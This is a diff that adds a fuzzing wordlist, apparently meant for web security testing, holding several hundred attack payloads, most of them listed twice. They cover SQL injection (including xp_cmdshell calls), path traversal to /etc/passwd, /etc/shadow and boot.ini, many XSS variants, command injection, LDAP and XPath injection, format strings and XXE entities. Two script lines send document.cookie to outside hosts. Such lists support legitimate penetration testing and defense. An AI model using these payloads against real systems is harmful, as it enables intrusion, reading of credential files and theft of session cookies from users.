@@ -1,0 +1,711 @@
+
+`
+^'
+<
+<<
+<<<
+<>"'%;)(&+
+<>"'%;)(&+
+<?
+=
+= --
+= ;
+= '
+>
+|
+||
+|
+_
+-
+--
+--';
+--';
+--
+-
+,
+;
+!
+!'
+!@#$%%^#$%#$@#$%$$@#$%^^**(()
+!
+/
+//
+//*
+//*
+//
+/.../.../.../.../.../
+/.../.../.../.../.../
+/'
+/
+../
+..\
+'
+' --
+' ;
+'
+"
+"
+(
+(')
+(
+)
+)
+[']
+{'}
+}
+@'
+@*
+*
+*|
+*|
+*/*
+*/*
+*'
+\
+\'
+\\
+\\/
+\\\\?\\
+\\\\*
+&
+&
+#
+#'
+#
+%
++
+¦
+0
+\0
+00
+/%00/
+\00
+\0\0
+%00
+%00/
++%00
+\0\0\0
+\00\00
+\00\00\00
+&#0000060
+&#0000060;
+&#000060
+&#000060;
+!@#0%^#0##018387@#0^^**(()
+&#00060
+&#00060;
+&#0060
+&#0060;
+%00../../../../../../etc/passwd
+%00../../../../../../etc/passwd
+%00/etc/passwd%00
+%00/etc/passwd%00
+%00../../../../../../etc/shadow
+%00../../../../../../etc/shadow
+%00/etc/shadow%00
+%00/etc/shadow%00
+%01%02%03%04%0a%0d%0aADSF
+&#060
+&#060;
+%0a
+%0a/bin/cat%20/etc/passwd
+%0a/bin/cat%20/etc/passwd
+%0a/bin/cat%20/etc/shadow
+%0a/bin/cat%20/etc/shadow
+%0d
+%0d%0aX-Injection-Header:%20AttackValue
+0 or 1=1
+0 or 1=1
+0xfffffff
+1
+-1
+-1.0
+&#10;
+1.0
+&#10;&#13;
+&#13;
+&#13;&#10;
+1;SELECT%20*
+1;SELECT%20*
+2
+-2
+=%20--
+=%20;
+=%20'
+-20
+'%20--
+'%20;
+%20
+%20|
+'%20or%20''='
+'%20or%201=1
+'%20or%201=1
+')%20or%20('x'='x
+'%20or%20'x'='x
+"%20or%20"x"="x
+%20'sleep%2050'
+%20'sleep%2050'
+%20$(sleep%2050)
+%20$(sleep%2050)
+%21
+%21
+2147483647
+%22%3E%3Cscript%3Edocument%2Elocation%3D%27http%3A%2F%2Fyour%2Esite%2Ecom%2Fcgi%2Dbin%2Fcookie%2Ecgi%3F%27%20%2Bdocument%2Ecookie%3C%2Fscript%3E
+%22%3E%3Cscript%3Edocument%2Elocation%3D%27http%3A%2F%2Fyour%2Esite%2Ecom%2Fcgi%2Dbin%2Fcookie%2Ecgi%3F%27%20%2Bdocument%2Ecookie%3C%2Fscript%3E
+%2500
+%250a
+..%25%35%63
+..%255c
+/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00
+/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00
+%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%	25%5c..%25%5c..%00
+%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%	25%5c..%25%5c..%00
+%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00
+%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00
+%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%		25%5c..%25%5c..%255cboot.ini
+%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%		25%5c..%25%5c..%255cboot.ini
+/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..winnt/desktop.ini
+/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..winnt/desktop.ini
+%26
+%26
+268435455
+-268435455
+%27%20or%201=1
+%27%20or%201=1
+%28
+%28
+%29
+%29
+/../../../../../../../../%2A
+/../../../../../../../../%2A
+/%2A
+%2A
+%2A%28%7C%28mail%3D%2A%29%29
+%2A%28%7C%28mail%3D%2A%29%29
+%2A%28%7C%28objectclass%3D%2A%29%29
+%2A%28%7C%28objectclass%3D%2A%29%29
+%2A%7C
+%2A%7C
+%2C
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.inicount(/child::node())
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow
+%2e%2e%2f
+..%%35%63
+..%%35c
+%3C
+%3C%3F
+'%3CIFRAME%20SRC=javascript:alert(%2527XSS%2527)%3E%3C/IFRAME%3E
+'%3CIFRAME%20SRC=javascript:alert(%2527XSS%2527)%3E%3C/IFRAME%3E
+%3Cscript%3Ealert(%22X%20SS%22);%3C/script%3E
+%3Cscript%3Ealert(%22X%20SS%22);%3C/script%3E
+%3cscript%3ealert(document.cookie);%3c%2fscript%3e
+%3cscript%3ealert(document.cookie);%3c%2fscript%3e
+%3cscript%3ealert("WXSS");%3c/script%3e
+%3cscript%3ealert("XSS");%3c/script%3e
+..%5c
+%5C
+%5C/
+&#60
+&#60;
+%60
+65536
+%7C
+%7C
+%7f
+A
+ABCD|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|
+admin'--
+admin'--
+';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//></SCRIPT>!--<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>=&{}
+';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//></SCRIPT>!--<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>=&{}
+\";alert('XSS');//
+\";alert('XSS');//
+^&apos;
+/&apos;
+[&apos;]
+{&apos;}
+@&apos;
+*&apos;
+\&apos;
+&apos;
+#&apos;
+&apos;%20OR
+&apos;%20OR
+\\&apos;/bin/cat%20/etc/passwd\\&apos;
+\\&apos;/bin/cat%20/etc/passwd\\&apos;
+\\&apos;/bin/cat%20/etc/shadow\\&apos;
+\\&apos;/bin/cat%20/etc/shadow\\&apos;
+as
+as
+asc
+asc
+bfilename
+bfilename
+..%bg%qf
+/../../../../../../../../bin/id|
+/../../../../../../../../bin/id|
+|/bin/ls -al
+\"blah
+/./././././././././././boot.ini
+/./././././././././././boot.ini
+/../../../../../../../../../../../boot.ini
+/../../../../../../../../../../../boot.ini
+/..\../..\../..\../..\../..\../..\../boot.ini
+/..\../..\../..\../..\../..\../..\../boot.ini
+/.\\./.\\./.\\./.\\./.\\./.\\./boot.ini
+/.\\./.\\./.\\./.\\./.\\./.\\./boot.ini
+/boot.ini
+../../../../../../../../../../../../boot.ini
+../../../../../../../../../../../../boot.ini
+../../boot.ini
+../../boot.ini
+..\..\..\..\..\..\..\..\..\..\boot.ini
+..\..\..\..\..\..\..\..\..\..\boot.ini
+\..\..\..\..\..\..\..\..\..\..\boot.ini
+\..\..\..\..\..\..\..\..\..\..\boot.ini
+/../../../../../../../../../../../boot.ini%00
+/../../../../../../../../../../../boot.ini%00
+../../../../../../../../../../../../boot.ini%00
+../../../../../../../../../../../../boot.ini%00
+..\..\..\..\..\..\..\..\..\..\boot.ini%00
+..\..\..\..\..\..\..\..\..\..\boot.ini%00
+/../../../../../../../../../../../boot.ini%00.html
+/../../../../../../../../../../../boot.ini%00.html
+/../../../../../../../../../../../boot.ini%00.jpg
+/../../../../../../../../../../../boot.ini%00.jpg
+..%c0%af
+..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini
+..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini
+/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd
+/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd
+/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow
+/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow
+C:/boot.ini
+C:/boot.ini
+C:\boot.ini
+C:\boot.ini
+<![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]>
+<![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]>
+<![CDATA[<script>var n=0;while(true){n++;}</script>]]>
+<![CDATA[<script>var n=0;while(true){n++;}</script>]]>
+char%4039%41%2b%40SELECT
+char%4039%41%2b%40SELECT
+C:/inetpub/wwwroot/global.asa
+C:/inetpub/wwwroot/global.asa
+C:\inetpub\wwwroot\global.asa
+C:\inetpub\wwwroot\global.asa
+../../../../../../../../conf/server.xml
+../../../../../../../../conf/server.xml
+count(/child::node())
+delete
+delete
+desc
+desc
+`dir`
+|dir
+|dir|
+;dir
+distinct
+distinct
+/,%ENV,/
+../../../../../../../../../../../../etc/hosts
+../../../../../../../../../../../../etc/hosts
+../../../../../../../../../../../../etc/hosts%00
+../../../../../../../../../../../../etc/hosts%00
+/./././././././././././etc/passwd
+/./././././././././././etc/passwd
+/../../../../../../../../../../etc/passwd
+/../../../../../../../../../../etc/passwd^^
+/../../../../../../../../../../etc/passwd^^
+/../../../../../../../../../../etc/passwd
+/..\../..\../..\../..\../..\../..\../etc/passwd
+/..\../..\../..\../..\../..\../..\../etc/passwd
+/etc/passwd
+../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../etc/passwd
+..\..\..\..\..\..\..\..\..\..\etc\passwd
+..\..\..\..\..\..\..\..\..\..\etc\passwd
+.\\./.\\./.\\./.\\./.\\./.\\./etc/passwd
+.\\./.\\./.\\./.\\./.\\./.\\./etc/passwd
+\..\..\..\..\..\..\..\..\..\..\etc\passwd
+\..\..\..\..\..\..\..\..\..\..\etc\passwd
+../../../../../../../../../../../../etc/passwd%00
+../../../../../../../../../../../../etc/passwd%00
+..\..\..\..\..\..\..\..\..\..\etc\passwd%00
+..\..\..\..\..\..\..\..\..\..\etc\passwd%00
+\..\..\..\..\..\..\..\..\..\..\etc\passwd%00
+\..\..\..\..\..\..\..\..\..\..\etc\passwd%00
+/../../../../../../../../../../../etc/passwd%00.html
+/../../../../../../../../../../../etc/passwd%00.html
+/../../../../../../../../../../../etc/passwd%00.jpg
+/../../../../../../../../../../../etc/passwd%00.jpg
+/./././././././././././etc/shadow
+/./././././././././././etc/shadow
+/../../../../../../../../../../etc/shadow
+/../../../../../../../../../../etc/shadow^^
+/../../../../../../../../../../etc/shadow^^
+/../../../../../../../../../../etc/shadow
+/..\../..\../..\../..\../..\../..\../etc/shadow
+/..\../..\../..\../..\../..\../..\../etc/shadow
+/etc/shadow
+../../../../../../../../../../../../etc/shadow
+../../../../../../../../../../../../etc/shadow
+..\..\..\..\..\..\..\..\..\..\etc\shadow
+..\..\..\..\..\..\..\..\..\..\etc\shadow
+.\\./.\\./.\\./.\\./.\\./.\\./etc/shadow
+.\\./.\\./.\\./.\\./.\\./.\\./etc/shadow
+\..\..\..\..\..\..\..\..\..\..\etc\shadow
+\..\..\..\..\..\..\..\..\..\..\etc\shadow
+../../../../../../../../../../../../etc/shadow%00
+../../../../../../../../../../../../etc/shadow%00
+..\..\..\..\..\..\..\..\..\..\etc\shadow%00
+..\..\..\..\..\..\..\..\..\..\etc\shadow%00
+\..\..\..\..\..\..\..\..\..\..\etc\shadow%00
+\..\..\..\..\..\..\..\..\..\..\etc\shadow%00
+'; exec master..xp_cmdshell
+'; exec master..xp_cmdshell
+exec sp
+exec sp
+exec xp
+exec xp
+'; exec xp_regread
+'; exec xp_regread
+FALSE
+%ff
+handler
+handler
+having
+having
+hi' or 1=1 --
+hi' or 1=1 --
+hi" or 1=1 --
+hi" or 1=1 --
+hi' or 'a'='a
+hi' or 'a'='a
+hi') or ('a'='a
+hi') or ('a'='a
+hi" or "a"="a
+hi" or "a"="a
+hi") or ("a"="a
+hi") or ("a"="a
+'hi' or 'x'='x';
+'hi' or 'x'='x';
+<HTML xmlns:xss><?import namespace="xss" implementation="http://ha.ckers.org/xss.htc"><xss:xss>XSS</xss:xss></HTML>
+<HTML xmlns:xss><?import namespace="xss" implementation="http://ha.ckers.org/xss.htc"><xss:xss>XSS</xss:xss></HTML>
+`id`
+|id
+|id|
+;id;
+id%00
+id%00|
+<IMG%20DYNSRC="javascript:alert('WXSS')">
+<IMG%20LOWSRC="javascript:alert('WXSS')">
+<IMG%20"""><SCRIPT>alert("WXSS")</SCRIPT>">
+<IMG%20SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+<IMG%20SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+<IMG%20SRC="%20&#14;%20javascript:alert('WXSS');">
+<IMG%20SRC='%26%23x6a;avasc%26%23000010ript:a%26%23x6c;ert(document.%26%23x63;ookie)'>
+<IMG%20SRC='%26%23x6a;avasc%26%23000010ript:a%26%23x6c;ert(document.%26%23x63;ookie)'>
+<IMG%20SRC='javasc	ript:alert(document.cookie)'>
+<IMG%20SRC='javasc	ript:alert(document.cookie)'>
+<IMG%20SRC='javascript:alert(document.cookie)'>
+<IMG%20SRC='javascript:alert(document.cookie)'>
+<IMG%20SRC=javascript:alert(&quot;WXSS&quot;)>
+<IMG%20SRC=javascript:alert(String.fromCharCode(88,83,83))>
+<IMG%20SRC=`javascript:alert("'WXSS'")`>
+<IMG%20SRC="jav	ascript:alert('WXSS');">
+<IMG%20SRC="javascript:alert('WXSS');">
+<IMG%20SRC="javascript:alert('WXSS')"
+<IMG%20SRC=javascript:alert('WXSS')>
+<IMG%20SRC=JaVaScRiPt:alert('WXSS')>
+<IMG%20SRC="jav&#x09;ascript:alert('WXSS');">
+<IMG%20SRC="jav&#x0A;ascript:alert('WXSS');">
+<IMG%20SRC="jav&#x0D;ascript:alert('WXSS');">
+<IMG%20SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+<IMG DYNSRC="javascript:alert('XSS')">
+<IMG LOWSRC="javascript:alert('XSS')">
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+<IMG SRC=" &#14;  javascript:alert('XSS');">
+<IMG SRC=javascript:alert(&quot;XSS&quot;)>
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+<IMG SRC=`javascript:alert("'XSS'")`>
+<IMG SRC="jav	ascript:alert('XSS');">
+<IMG SRC="javascript:alert('XSS');">
+<IMG SRC="javascript:alert('XSS')"
+<IMG SRC=javascript:alert('XSS')>
+<IMG SRC=JaVaScRiPt:alert('XSS')>
+<IMG SRC="jav&#x09;ascript:alert('XSS');">
+<IMG SRC="jav&#x0A;ascript:alert('XSS');">
+<IMG SRC="jav&#x0D;ascript:alert('XSS');">
+<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+/index.html|id|
+insert
+insert
+like
+like
+limit
+limit
+../../../../../../../../../../../../localstart.asp
+../../../../../../../../../../../../localstart.asp
+../../../../../../../../../../../../localstart.asp%00
+../../../../../../../../../../../../localstart.asp%00
+|ls
+|ls -la
+;ls -la
+&lt
+&lt;
+&LT
+&LT;
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
+&lt;&gt;&quot;'%;)(&amp;+
+&lt;&gt;&quot;'%;)(&amp;+
+&ltscript&gtalert(document.cookie);&ltscript&gtalert
+&ltscript&gtalert(document.cookie);&ltscript&gtalert
+&ltscript&gtalert(document.cookie);</script>
+&ltscript&gtalert(document.cookie);</script>
+*(|(mail=*))
+*(|(mail=*))
+%n
+<name>','')); phpinfo(); exit;/*</name>
+<name>','')); phpinfo(); exit;/*</name>
+\n/bin/ls -al\n
+;netstat -a;
+\nnetstat -a%\n
+null
+$null
+NULL
+$NULL
+*(|(objectclass=*))
+*(|(objectclass=*))
+or
+' or ''='
+' or ''='
+or
+' or 0=0 --
+' or 0=0 --
+' or 0=0 #
+' or 0=0 #
+" or 0=0 --
+" or 0=0 --
+" or 0=0 #
+" or 0=0 #
+or 0=0 --
+or 0=0 --
+or 0=0 #
+or 0=0 #
+"' or 1 --'"
+"' or 1 --'"
+' or '1'='1'--
+' or '1'='1'--
+' or 1=1--
+' or 1=1--
+" or 1=1--
+" or 1=1--
+or 1=1--
+or 1=1--
+' or 1=1 or ''='
+' or 1=1 or ''='
+" or 1=1 or ""="
+" or 1=1 or ""="
+or%201=1
+or%201=1 --
+or%201=1 --
+or%201=1
+'or%20select *
+' or a=a--
+' or a=a--
+') or ('a'='a
+') or ('a'='a
+" or "a"="a
+" or "a"="a
+") or ("a"="a
+") or ("a"="a
+order by
+order by
+' or (EXISTS)
+' or (EXISTS)
+'or select *
+' or uid like '%
+' or uid like '%
+' or uname like '%
+' or uname like '%
+' or userid like '%
+' or userid like '%
+' or user like '%
+' or user like '%
+' or username like '%
+' or username like '%
+' or 'x'='x
+') or ('x'='x
+" or "x"="x
+PRINT
+PRINT
+PRINT @@variable
+PRINT @@variable
+procedure
+procedure
+&quot;;id&quot;
+;read;
+replace
+replace
+%s
+"><script>"
+"><script>"
+<script>alert(document.cookie)</script>
+<script>alert(document.cookie)</script>
+'><script>alert(document.cookie)</script>
+'><script>alert(document.cookie)</script>
+'><script>alert(document.cookie);</script>
+'><script>alert(document.cookie);</script>
+<<script>alert("WXSS");//<</script>
+<script>alert("WXSS")</script>
+<<script>alert("XSS");//<</script>
+<script>alert("XSS")</script>
+"><script>document.location='http://cookieStealer/cgi-bin/cookie.cgi?'+document.cookie</script>
+"><script>document.location='http://your.site.com/cgi-bin/cookie.cgi?'+document.cookie</script>
+<  script > < / script>
+select
+select
+' (select top 1
+' (select top 1
+something%00html
+--sp_password
+--sp_password
+'sqlattempt1
+'sqlattempt1
+(sqlattempt2)
+(sqlattempt2)
+"\t"
+\t
+t'exec master..xp_cmdshell 'nslookup www.google.com'--
+t'exec master..xp_cmdshell 'nslookup www.google.com'--
+to_timestamp_tz
+to_timestamp_tz
+TRUE
+truncate
+truncate
+tz_offset
+tz_offset
+\u003c
+\u003C
+..%u2215
+..%u2216
+' UNION ALL SELECT
+' UNION ALL SELECT
+' UNION SELECT
+' UNION SELECT
+update
+update
+'||UTL_HTTP.REQUEST
+'||UTL_HTTP.REQUEST
+,@variable
+,@variable
+@variable
+@variable
+?x=
+?x=>
+?x=|
+?x="
+%x 
+&#x000003c
+&#x000003c;
+&#x000003C
+&#x000003C;
+&#X000003c
+&#X000003c;
+&#X000003C
+&#X000003C;
+&#x00003c
+&#x00003c;
+&#x00003C
+&#x00003C;
+&#X00003c
+&#X00003c;
+&#X00003C
+&#X00003C;
+&#x0003c
+&#x0003c;
+&#x0003C
+&#x0003C;
+&#X0003c
+&#X0003c;
+&#X0003C
+&#X0003C;
+&#x003c
+&#x003c;
+&#x003C
+&#x003C;
+&#X003c
+&#X003c;
+&#X003C
+&#X003C;
+&#x03c
+&#x03c;
+&#x03C
+&#x03C;
+&#X03c
+&#X03c;
+&#X03C
+&#X03C;
+\x23
+\x23
+\x27
+\x27
+\x27UNION SELECT
+\x27UNION SELECT
+\x27\x4F\x52 SELECT *
+\x27\x4F\x52 SELECT *
+\x27\x6F\x72 SELECT *
+\x27\x6F\x72 SELECT *
+\x3c
+&#x3c
+&#x3c;
+\x3C
+&#x3C
+&#x3C;
+&#X3c
+&#X3c;
+&#X3C
+&#X3C;
+\x3D%20\x27
+\x3D%20\x3B'
+\x3D \x27
+\x3D \x3B'
+#xA
+#xA#xD
+#xD
+#xD#xA
+<xml ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert('XSS');">]]>
+<xml ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert('XSS');">]]>
+<xml ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:alert('XSS')"&gt;</B></I></xml><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+<xml ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:alert('XSS')"&gt;</B></I></xml><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+<xml SRC="xsstest.xml" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+<xml SRC="xsstest.xml" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file://c:/boot.ini">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file://c:/boot.ini">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////dev/random">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////dev/random">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////etc/passwd">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////etc/passwd">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////etc/shadow">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////etc/shadow">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[' or 1=1 or ''=']]></foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[' or 1=1 or ''=']]></foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>
+x' or 1=1 or 'x'='y
+x' or 1=1 or 'x'='y
+x' or name()='username' or 'x'='y
+x' or name()='username' or 'x'='y
+'';!--"<XSS>=&{()}
+'';!--"<XSS>=&{()}
+<xss><script>alert('WXSS')</script></vulnerable>
+<xss><script>alert('XSS')</script></vulnerable>
+">xxx<P>yyy
